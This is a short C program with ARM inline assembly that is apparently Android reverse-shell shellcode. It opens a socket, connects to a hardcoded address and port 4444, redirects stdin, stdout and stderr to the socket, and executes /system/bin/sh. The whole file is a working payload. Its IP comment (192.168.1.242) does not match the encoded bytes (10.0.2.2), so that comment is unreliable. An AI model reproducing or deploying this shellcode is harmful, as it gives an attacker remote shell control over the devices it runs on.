
connect_asm() {
  __asm__(
      //socket(PF_INET, SOCK_STREAM, 0);
      "mov	r1, #1\n"
      "mov	r2, #0\n"
      "mov	r0, #2\n"
      "mov	r7, #255\n"
      "add	r7, r7, #26\n"
      "svc	0x00\n"
      //connect(sock, sockaddr, 0x10);
      "add	r4, r0, #0\n"
      "mov	r2, #16\n"
      "add	r1, pc, #36\n"
      "mov	r7, #255\n"
      "add	r7, r7, #28\n"
      "svc	0x00\n"
      //dup2(sock, stdin);
      "mov	r7, #63\n"
      "add	r0, r4, #0\n"
      "mov	r1, #0\n"
      "svc	0x00\n"
      //dup2(sock, stdout);
      "add	r0, r4, #0\n"
      "movs	r1, #1\n"
      "svc	0x00\n"
      //dup2(sock, stderr);
      "add	r0, r4, #0\n"
      "mov	r1, #2\n"
      "svc	0x00\n"
      // execve("/system/bin/sh", args, env)
      "add	r1, pc, #16\n"
      "eor	r2, r2\n"
      "add	r0, pc, #20\n"
      //"str	r0, [r1, #0]\n"
      "eor	r2, r2\n"
      "mov	r7, #11\n"
      "svc 	0x00\n"

      ".hword	2\n"                // sin_fam = 2
      ".hword	0x5c11\n"           // port: 4444
      ".byte	10, 0, 2, 2\n" // ip: 192.168.1.242
      ".word	0\n"                // args
      ".word	0\n"
      ".byte	'/', 's', 'y', 's', 't', 'e', 'm', '/', 'b', 'i', 'n', '/', 's', 'h', 0\n"
      ".align\n"
      );
}

int main() 
{
  connect_asm();
}
